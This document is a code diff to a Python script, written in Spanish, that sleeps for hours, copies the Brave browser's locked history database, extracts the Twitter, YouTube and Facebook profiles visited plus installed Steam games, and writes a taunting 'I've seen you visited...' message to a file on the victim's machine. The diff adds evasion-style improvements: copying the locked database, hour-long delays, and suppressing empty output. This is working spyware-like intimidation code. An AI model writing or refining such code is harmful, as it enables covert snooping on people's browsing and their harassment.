@@ -4,6 +4,7 @@ import random
 import re
 import sqlite3
 from pathlib import Path
+from shutil import copyfile
 from time import sleep
 
 NAMEFILE = "QUE ONDA PUTO.txt"
@@ -13,8 +14,7 @@ def get_path():
 
 def dormicion():
     n_hours = random.randrange(1, 4)
-    print(n_hours)
-    sleep(n_hours)
+    sleep(n_hours * 60 * 60)
 
 
 def crear_archivo(path):
@@ -28,7 +28,9 @@ def history_chrome(Path):
     while not urls:
         try:
             db_path = Path + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
-            connection = sqlite3.connect(db_path)
+            temp_history = db_path + "temp"
+            copyfile(db_path,temp_history)
+            connection = sqlite3.connect(temp_history)
             cursor = connection.cursor()
             cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
             urls = cursor.fetchall()
@@ -37,7 +39,7 @@ def history_chrome(Path):
             return urls
         except sqlite3.OperationalError:
             print("Imposible de acceder al historial reintentando en 1 hora")
-            sleep(5)
+            sleep(1 * 60 * 60)
 
 
 def check_twitter(file, urls):
@@ -46,7 +48,8 @@ def check_twitter(file, urls):
         resluts = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
         if resluts and resluts[0] not in ["notifications", "home","login"]:
             profile_twitter.append(resluts[0])
-    file.write("Eh visto que has visitado los perfiles de twitter de {}... \n".format(", ".join(profile_twitter)))
+    if profile_twitter:
+        file.write("Eh visto que has visitado los perfiles de twitter de {}... \n".format(", ".join(profile_twitter)))
 
 
 def check_youtube(file, urls):
@@ -55,7 +58,8 @@ def check_youtube(file, urls):
         results = re.findall("https://www.youtube.com/user/([A-Za-z0-9]+)$" and "https://www.youtube.com/c/([A-Za-z0-9]+)$", item[2])
         if results:
             profile_youtube.append(results[0])
-    file.write("Eh visto que has visitado los perfiles de youtube de {}... \n".format(", ".join(profile_youtube)))
+    if profile_youtube:
+        file.write("Eh visto que has visitado los perfiles de youtube de {}... \n".format(", ".join(profile_youtube)))
 
 
 def check_facebook(file, urls):
@@ -64,7 +68,8 @@ def check_facebook(file, urls):
         results = re.findall("https://www.facebook.com/([A-Za-z0-9]+)$", item[2])
         if results and results[0] not in ["stories", "friends", "watch", "marketplace", "gaming"]:
             profile_facebook.append(results[0])
-    file.write("Eh visto que has visitado los perfiles de facebook de {}... \n".format(", ".join(profile_facebook)))
+    if profile_facebook:
+        file.write("Eh visto que has visitado los perfiles de facebook de {}... \n".format(", ".join(profile_facebook)))
 
 
 def check_steam(file):
@@ -77,7 +82,8 @@ def check_steam(file):
             games_paths = games_paths.split("\\")[-1]
             if games_paths not in ["wallpaper_engine","Steam Controller Configs","Steamworks Shared"]:
                 games.append(games_paths.split("\\")[-1])
-        file.write("Tambien estuviste jugando a estos juegos {}".format(", ".join(games)))
+        if games:
+            file.write("Tambien estuviste jugando a estos juegos {}".format(", ".join(games)))
     except:
         print("No tiene steam")
 
